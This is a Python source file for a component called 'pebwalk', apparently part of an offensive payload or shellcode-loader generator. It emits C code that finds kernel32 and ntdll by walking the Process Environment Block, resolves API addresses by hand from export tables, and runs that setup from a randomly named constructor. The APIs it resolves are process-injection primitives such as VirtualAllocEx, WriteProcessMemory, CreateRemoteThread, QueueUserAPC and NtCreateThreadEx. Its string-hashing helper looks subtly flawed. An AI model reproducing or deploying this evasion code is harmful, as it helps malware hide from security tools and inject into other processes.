import random
import string

class pebwalk:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        self.typedefs = {
            "VirtualAlloc":"typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);",
            "CreateThread":"typedef HANDLE (WINAPI *CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);",
            "HeapAlloc":"typedef LPVOID (WINAPI *HeapAlloc_t)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);",
            "HeapCreate":"typedef HANDLE (WINAPI *HeapCreate_t)(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);",
            "WriteProcessMemory":"typedef BOOL (WINAPI *WriteProcessMemory_t)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);",
            "CreateProcessA":"typedef BOOL (WINAPI *CreateProcessA_t)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);",
            "CloseHandle":"typedef BOOL (WINAPI *CloseHandle_t)(HANDLE hObject);",
            "WaitForSingleObject":"typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);",
            "VirtualFree":"typedef BOOL (WINAPI *VirtualFree_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);",
            "HeapDestroy":"typedef BOOL (WINAPI *HeapDestroy_t)(HANDLE hHeap);",
            "HeapFree":"typedef BOOL (WINAPI *HeapFree_t)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);",
            "CreateRemoteThread":"typedef HANDLE (WINAPI *CreateRemoteThread_t)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameters, DWORD dwCreationFlags, LPDWORD lpThreadId);",
            "VirtualAllocEx":"typedef LPVOID (WINAPI *VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);",
            "QueueUserAPC":"typedef DWORD (WINAPI *QueueUserAPC_t)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);",
            "ResumeThread":"typedef DWORD (WINAPI *ResumeThread_t)(HANDLE hThread);",
            "GetThreadContext":"typedef DWORD (WINAPI *GetThreadContext_t)(HANDLE hThread, LPCONTEXT lpContext);",
            "SetThreadContext":"typedef DWORD (WINAPI *SetThreadContext_t)(HANDLE hThread, LPCONTEXT lpContext);",
            "NtAllocateVirtualMemory":"typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);",
            "NtCreateThreadEx":"typedef NTSTATUS (WINAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);"
        }

    def imports(self) -> list[str]:
        return ['#include <windows.h>',
                "#include <winternl.h>",
                "#include <ntdef.h>"]

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        kernel32 = []
        ntdll = []
        codeblock = ''
        for apicall in self.apicalls:
            if apicall[0:2] in ['Nt', 'Zw']:
                ntdll.append(apicall)
            else:
                kernel32.append(apicall)

        codeblock += """

typedef struct _MY_PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} MY_PEB_LDR_DATA, *MY_PPEB_LDR_DATA;

typedef struct _MY_PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    MY_PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ReservedBits0 : 27;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    ULONG GdiHandleBuffer[60];
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PVOID* FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG SpareTracingBits : 30;
        };
    };
} MY_PEB, *MY_PPEB;

typedef struct _MY_LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG_PTR OriginalBase;
    LARGE_INTEGER LoadTime;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

PVOID LoadModulePeb( LPWSTR ModuleName )
{

    MY_PPEB PPEB_PTR = (MY_PPEB)__readgsqword( 0x60 );
    PLIST_ENTRY Module      = ( ( MY_PPEB ) PPEB_PTR )->Ldr->InLoadOrderModuleList.Flink; 
    PLIST_ENTRY FirstModule = Module;

    WCHAR  SearchModuleLower[ MAX_PATH ]  = { 0 };
    WCHAR  PebModuleLower   [ MAX_PATH ]  = { 0 };

    // Zero a buffer to contain the lowercased module to find
    RtlSecureZeroMemory( SearchModuleLower, MAX_PATH );
    memcpy( SearchModuleLower, ModuleName, wcslen( ModuleName ) * 2 ); // wcslen returns char count, widestr == double  bytes
    CharLowerBuffW( SearchModuleLower, wcslen( ModuleName ) );
    do
    {
        // Zero a buffer and lowercase the found module name
        RtlSecureZeroMemory( PebModuleLower, MAX_PATH );
        PMY_LDR_DATA_TABLE_ENTRY mod = (PMY_LDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(
            Module, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
        );
        memcpy( PebModuleLower, mod->BaseDllName.Buffer, mod->BaseDllName.Length );
        CharLowerBuffW( PebModuleLower, mod->BaseDllName.Length );

        // If the lowercased strings match, return the address of the DLL
        if ( !( wcscmp( SearchModuleLower, PebModuleLower) ) ){
            return mod->DllBase;
        }
        Module = Module->Flink;
    } while ( Module && Module != FirstModule );

    return 0;
}


PVOID LoadFunction( PBYTE Module, LPSTR FunctionName )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    LPSTR                   FoundName        = NULL;
    CHAR       LowerFoundName   [ MAX_PATH ] = { 0 };
    CHAR       LowerFunctionName[ MAX_PATH ] = { 0 };

    // Zero a buffer to contain the function to resolve, lowercased
    RtlSecureZeroMemory( LowerFunctionName, MAX_PATH );
    memcpy( LowerFunctionName, FunctionName, strlen( FunctionName ) );
    CharLowerBuffA( LowerFunctionName, strlen( FunctionName ) );

    NtHeader         = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    ExpDirectory     = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);
    
    // Resolve absolute address of important export directory members
    AddrOfNames      = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions  = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals   = (PWORD)(Module + ExpDirectory->AddressOfNameOrdinals);

    // Walk through the number of names
    for ( DWORD I = 0; I < ExpDirectory->NumberOfNames; I++ )
    {
        // Zero a buffer to contain the found function, lowercased
        RtlSecureZeroMemory( LowerFoundName, MAX_PATH );
        FoundName = ( PCHAR ) Module + AddrOfNames[ I ]; // This gets the address of the function's name
        memcpy( LowerFoundName, FoundName, strlen( FoundName ) );
        CharLowerBuffA( LowerFoundName, strlen( FoundName ) );

        // Check if the lowercased strings match
        if ( !strcmp( LowerFoundName, LowerFunctionName ) )
        {
            // If they match, resolve the address of the function's code
            FunctionAddr = Module + AddrOfFunctions[ AddrOfOrdinals[ I ] ];

            if ( 
                (void *)FunctionAddr > (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress) && 
                (void *)FunctionAddr < (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress + NtHeader->OptionalHeader.DataDirectory[ 0 ].Size)
            ) // Forwarders are inside export table
            {
                // We can use getProcAddr to resolve forwarders
                // Manually is difficult -- we may run into apisets rather than simple [module].[export] strings
                return GetProcAddress( (HMODULE)Module, FoundName );
            }
            return FunctionAddr;
        }
    }
    return NULL;
}
"""


        if 'NtCreateThreadEx' in ntdll:
            codeblock += """
typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
        

_Struct_size_bytes_(TotalLength)
typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
"""

        codeblock += f"""

{'\n'.join([value for key,value in self.typedefs.items() if key in self.apicalls ])}

typedef struct {{
    {'\n\t'.join([f'{x}_t {x}_resolved;' for x in self.apicalls ])}
}} Resolver;

Resolver resolver;

void {self.name}(void) __attribute__((constructor));

void {self.name}(){{
"""
        if len(kernel32) > 0:
            codeblock += f"""
    PVOID kernelHandle = LoadModulePeb(L"kernel32.dll");
    {'\n\t'.join([f'resolver.{x}_resolved = ({x}_t)LoadFunction(kernelHandle, "{x}");' for x in kernel32])};
"""

        if len(ntdll) > 0:
            codeblock += f"""
    PVOID ntdllHandle = LoadModulePeb(L"ntdll.dll");
    {'\n\t'.join([f'resolver.{x}_resolved = ({x}_t)LoadFunction(ntdllHandle, "{x}");' for x in ntdll])};
"""

        codeblock += f"""
}}
"""
        return codeblock

    def resolve(self, apicalls):
        resolved = {}
        self.apicalls = apicalls
        for apicall in apicalls:
            resolved[apicall] = f'resolver.{apicall}_resolved'
        return resolved

    def hash_string(self, functionName, isWide=True ):
        # The hash value (5381 in this case) has to be the same for the Python script and the C code
        hash = 5381
        # Convert the input string to uppercase for case insensitivity
        functionName = functionName.upper()

        for x in range(0, len(functionName), 1):
            # If isWide is False or it's the first character
            if x == 0 or not isWide:
                # Incorporate the ordinal value of the character into hash calculation
                hash = (( hash << 5 ) + hash ) + ord(functionName[x])

            if isWide:
                # Only perform hash calculation without including ordinal value of character
                hash = (( hash << 5 ) + hash )

                # Check if it's the end of the string for wide strings
                if x == len(functionName):
                    hash = (( hash << 5 ) + hash )

        return hash & 0xFFFFFFFF 